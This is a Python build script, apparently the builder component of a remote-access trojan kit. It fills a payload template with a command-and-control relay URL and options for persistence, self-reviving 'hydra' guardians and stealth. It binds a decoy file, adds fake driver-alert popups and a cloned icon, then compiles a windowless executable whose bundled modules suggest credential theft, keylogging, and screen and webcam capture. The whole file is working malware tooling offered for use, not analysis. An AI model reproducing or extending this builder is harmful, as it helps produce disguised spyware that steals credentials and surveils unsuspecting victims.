# builder.py (Definitive, Ultimate Version with Full Templating & Robust Imports)
import os, subprocess, shutil, tempfile, sys, base64, json

def build_payload(settings, relay_url, c2_user, log_callback, thread_object):
    template_path = "payload_template.py"; output_path = "output"
    if not os.path.exists(output_path): os.makedirs(output_path)
    
    payload_name = settings.get("payload_name", "payload.exe")
    
    with tempfile.TemporaryDirectory() as temp_dir:
        log_callback("--> Creating build environment...")
        temp_script_path = os.path.join(temp_dir, "temp_agent.py")
        
        with open(template_path, "r", encoding="utf-8") as f:
            code = f.read()
        
        code = code.replace("{{RELAY_URL}}", f"'{relay_url}'")
        code = code.replace("{{C2_USER}}", f"'{c2_user}'")
        
        code = code.replace("{{PERSISTENCE_ENABLED}}", str(settings.get("persistence", False)))
        code = code.replace("{{HYDRA_ENABLED}}", str(settings.get("hydra", False)))
        code = code.replace("{{HYDRA_GUARDIANS}}", str(settings.get("hydra_guardians", [])))
        code = code.replace("{{REVIVE_MSG_ENABLED}}", str(settings.get("revive_msg_enabled", False)))
        code = code.replace("{{REVIVE_TITLE}}", json.dumps(settings.get("revive_title", "Driver Alert")))
        code = code.replace("{{REVIVE_MESSAGE}}", json.dumps(settings.get("revive_message", "A critical driver has recovered from an error.")))

        code = code.replace("{{POPUP_ENABLED}}", str(settings.get("popup_enabled", False)))
        code = code.replace("{{POPUP_TITLE}}", json.dumps(settings.get("popup_title", "Installation Notice")))
        code = code.replace("{{POPUP_MESSAGE}}", json.dumps(settings.get("popup_message", "Setup is complete.")))
        
        decoy_filename = "''"; decoy_data_b64 = "''"
        if settings.get("bind_path"):
            bind_path = settings['bind_path']
            log_callback(f"--> Binding file: {os.path.basename(bind_path)}")
            decoy_filename = f"'{os.path.basename(bind_path)}'"
            with open(bind_path, 'rb') as f:
                decoy_data_b64 = f"'{base64.b64encode(f.read()).decode()}'"
        code = code.replace("{{DECOY_ENABLED}}", str(bool(settings.get("bind_path"))))
        code = code.replace("{{DECOY_FILENAME}}", decoy_filename)
        code = code.replace("{{DECOY_DATA_B64}}", decoy_data_b64)

        code = code.replace("{{STEALTH_MODE}}", str(settings.get("stealth", False)))

        with open(temp_script_path, "w", encoding="utf-8") as f: f.write(code)
            
        log_callback("--> Compiling with PyInstaller...")
        
        command = [sys.executable, "-m", "PyInstaller", '--onefile', '--noconsole', '--name', os.path.splitext(payload_name)[0]]
        if settings.get("clone_path"):
             command.extend(['--icon', settings['clone_path']])
        
        # --- FIX: Added 'ctypes' and 'socket' for robustness ---
        hidden_imports = [
            'requests', 'psutil', 'win32crypt', 'mss', 'pynput', 'PIL', 
            'pycaw', 'comtypes', 'winreg', 'shutil', 'sqlite3', 'base64', 
            'json', 're', 'io', 'zlib', 'getpass', 'tkinter', 'winsound', 'cv2',
            'ctypes', 'socket'
        ]
        for imp in hidden_imports: command.extend(['--hidden-import', imp])
        command.append(temp_script_path)
        
        process = subprocess.Popen(
            command, cwd=temp_dir, stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT, text=True,
            creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0,
            encoding='utf-8', errors='ignore'
        )
        
        thread_object.proc = process
        
        for line in iter(process.stdout.readline, ''):
            if not thread_object._is_running:
                log_callback("\n[INFO] Build process terminated by user.")
                break
            log_callback(line.strip())
        
        process.wait()
        
        if process.returncode == 0 and thread_object._is_running:
            shutil.move(os.path.join(temp_dir, 'dist', payload_name), os.path.join(output_path, payload_name))
            log_callback(f"\n[SUCCESS] Payload saved to: {os.path.abspath(output_path)}")
        elif thread_object._is_running:
            log_callback(f"\n[ERROR] PyInstaller failed with code {process.returncode}.")
            
        return process